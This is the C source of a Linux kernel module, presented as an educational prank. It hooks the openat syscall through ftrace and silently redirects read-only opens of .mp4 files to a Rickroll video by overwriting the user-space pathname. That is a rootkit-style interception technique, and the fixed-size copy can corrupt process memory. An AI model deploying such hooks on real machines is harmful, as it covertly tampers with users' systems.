#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include "ftrace_helper.h" // xcellerator's ftrace_helper header file, checkout his blog, he's cool

/*
 * Author: Chathursha nimash (n0b0dy - https://github.com/someonebutnotme)
 *
 * This was developed and tested on a Linux Mint 22.2 x86-64 virtual machine
 * THIS WAS DEVELOPED MERELY FOR EDUCATIONAL PURPOSES
 * PLEASE COMPILE AND INSTALL THIS ON A VIRTUAL MACHINE
 * DO NOT INSTALL THIS LKM ON A REAL MACHINE
 * DOING SO MIGHT BRICK YOUR WHOLE OPERATING SYSTEM
 * I'M NOT RESPONSIBLE FOR ANY DAMAGES
 */

/*=======================> REPLACE THIS <=======================*/
#define RICKROLL_PATH "/home/n0b0dy/Downloads/Rickroll {HD + No ads}.mp4"
/*==============================================================*/

MODULE_AUTHOR("n0b0dy - https://github.com/someonebutnotme");
MODULE_DESCRIPTION("Never gonna give you up...");
MODULE_LICENSE("GPL");

static asmlinkage long(*orig_openat)(const struct pt_regs *);

static asmlinkage int hook_openat(const struct pt_regs *regs){
	char buff[256];
	memset(buff, 0, sizeof(buff));
	char __user *pathname = (char __user *) regs->si;
	int mode = (int) regs->dx; // access mode
	int copied = strncpy_from_user(buff, pathname, sizeof(buff)-1); // copy the filepath from user-space to kernel-space
	if(copied < 0){ // if something went wrong when copying...
		return orig_openat(regs); // return the original openat()
	}
	buff[sizeof(buff)-1] = '\0';
	char *file_extension = strrchr(buff, '.'); // a pointer to rightmost dot character
	if(file_extension && !strcmp(file_extension, ".mp4")){ // if the filename ends with .mp4
		pr_info("opened a mp4 file %s\nmode = 0x%x\n", buff, mode); // for debugging purposes
		if((mode & O_ACCMODE) == O_RDONLY){ // we have to check the access mode, if it was opened for writing, the rickroll video's content will get overwritten
			pr_info("opened for read-only\n");
			if(copy_to_user(pathname, RICKROLL_PATH, sizeof(RICKROLL_PATH))){ // changes the pathname to rickroll video filepath
				pr_err("failed to copy to user!\n"); // for debugging
			}
		}
		
	}
	return orig_openat(regs);
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_openat", hook_openat, &orig_openat) // I'm only going to hook into openat() syscall bcuz my Linux mint use openat() to open files (most modern distros use openat())
							    // it might be a good idea to hook into open() syscall also bcuz some distros use this syscall to open files (I'm not going to do that bcuz I'm too lazy to implement it :3)
};

static int __init rickroll_init(void){
	int error;
	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(error){
		return error;
	}
	pr_info("We're no strangers to love...\n");
	pr_info("You know the rules and so do I...\n");
	return 0;
}

static void __exit rickroll_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	pr_info("Never gonna make you cry...\n");
	pr_info("Never gonna say goodbye...\n");
	pr_info("Never gonna tell a lie and hurt you...\n");
}

module_init(rickroll_init);
module_exit(rickroll_exit);
